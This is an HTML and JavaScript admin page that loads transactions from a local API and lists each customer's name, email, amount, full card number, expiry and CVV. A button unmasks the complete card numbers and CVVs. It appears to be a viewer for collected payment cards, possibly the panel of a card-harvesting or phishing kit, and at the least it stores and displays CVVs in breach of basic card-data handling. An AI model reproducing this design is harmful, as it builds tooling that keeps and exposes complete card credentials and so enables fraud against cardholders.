<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin — Transactions</title>
  <style>
    :root { --ink:#0f172a; --muted:#64748b; --line:#e2e8f0; --brand:#4f46e5; }
    * { box-sizing: border-box; }
    body {
      margin: 0; padding: 32px; background: #f1f5f9; color: var(--ink);
      font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    }
    .wrap { max-width: 1180px; margin: 0 auto; }
    header { display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
    h1 { font-size: 22px; margin: 0; }
    .actions { display: flex; gap: 10px; align-items: center; }
    button, input[type="search"] {
      font: inherit; padding: 9px 12px; border-radius: 8px; border: 1px solid var(--line); background: #fff;
    }
    button { cursor: pointer; font-weight: 600; }
    button:hover { background: #f8fafc; }
    .stats { display: flex; gap: 14px; margin: 20px 0; flex-wrap: wrap; }
    .stat { background: #fff; border: 1px solid var(--line); border-radius: 12px; padding: 14px 18px; min-width: 160px; }
    .stat .label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .04em; }
    .stat .value { font-size: 24px; font-weight: 700; margin-top: 4px; }
    .table-wrap { background: #fff; border: 1px solid var(--line); border-radius: 12px; overflow: auto; }
    table { width: 100%; border-collapse: collapse; font-size: 14px; white-space: nowrap; }
    th, td { text-align: left; padding: 12px 14px; border-bottom: 1px solid var(--line); }
    th { font-size: 12px; text-transform: uppercase; letter-spacing: .04em; color: var(--muted); background: #f8fafc; }
    tbody tr:last-child td { border-bottom: none; }
    tbody tr:hover { background: #f8fafc; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
    .pill { background: #dcfce7; color: #15803d; border-radius: 999px; padding: 3px 10px; font-size: 12px; font-weight: 600; }
    .empty, .muted { color: var(--muted); }
    .empty { padding: 40px; text-align: center; }
  </style>
</head>
<body>
  <div class="wrap">
    <header>
      <h1>Transactions</h1>
      <div class="actions">
        <input id="search" type="search" placeholder="Search name, email, card…" />
        <button id="reveal" type="button">Reveal card numbers</button>
        <button id="refresh" type="button">Refresh</button>
      </div>
    </header>

    <div class="stats">
      <div class="stat"><div class="label">Transactions</div><div class="value" id="count">—</div></div>
      <div class="stat"><div class="label">Total collected</div><div class="value" id="total">—</div></div>
      <div class="stat"><div class="label">Average</div><div class="value" id="avg">—</div></div>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>ID</th><th>Date</th><th>Name</th><th>Email</th><th>Amount</th>
            <th>Brand</th><th>Card number</th><th>Name on card</th><th>Expiry</th><th>CVV</th><th>Status</th>
          </tr>
        </thead>
        <tbody id="rows"></tbody>
      </table>
      <div class="empty" id="empty" hidden>No transactions yet.</div>
    </div>
  </div>

  <script>
    let all = [];
    let revealed = false;

    const usd = (n) => n.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
    const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
    const mask = (num) => '•'.repeat(Math.max(0, num.length - 4)) + num.slice(-4);
    const group = (num) => num.replace(/(.{4})(?=.)/g, '$1 ');

    async function load() {
      const res = await fetch('/api/transactions');
      const data = await res.json();
      all = data.transactions;
      document.getElementById('count').textContent = data.count;
      document.getElementById('total').textContent = usd(data.total);
      document.getElementById('avg').textContent = data.count ? usd(data.total / data.count) : usd(0);
      render();
    }

    function render() {
      const q = document.getElementById('search').value.trim().toLowerCase();
      const rows = all.filter((t) =>
        !q || [t.name, t.email, t.card_name, t.card_number].some((v) => String(v || '').toLowerCase().includes(q))
      );
      document.getElementById('empty').hidden = rows.length > 0;
      document.getElementById('rows').innerHTML = rows.map((t) => `
        <tr>
          <td class="mono">#${t.id}</td>
          <td class="muted">${esc(t.created_at)} UTC</td>
          <td>${esc(t.name)}</td>
          <td>${esc(t.email)}</td>
          <td><b>${usd(t.amount)}</b></td>
          <td>${esc(t.brand)}</td>
          <td class="mono">${esc(group(revealed ? t.card_number : mask(t.card_number)))}</td>
          <td>${esc(t.card_name || '—')}</td>
          <td class="mono">${esc(t.expiry)}</td>
          <td class="mono">${revealed ? esc(t.cvv) : '•••'}</td>
          <td><span class="pill">${esc(t.status)}</span></td>
        </tr>
      `).join('');
    }

    document.getElementById('refresh').addEventListener('click', load);
    document.getElementById('search').addEventListener('input', render);
    document.getElementById('reveal').addEventListener('click', (e) => {
      revealed = !revealed;
      e.target.textContent = revealed ? 'Hide card numbers' : 'Reveal card numbers';
      render();
    });

    load();
  </script>
</body>
</html>
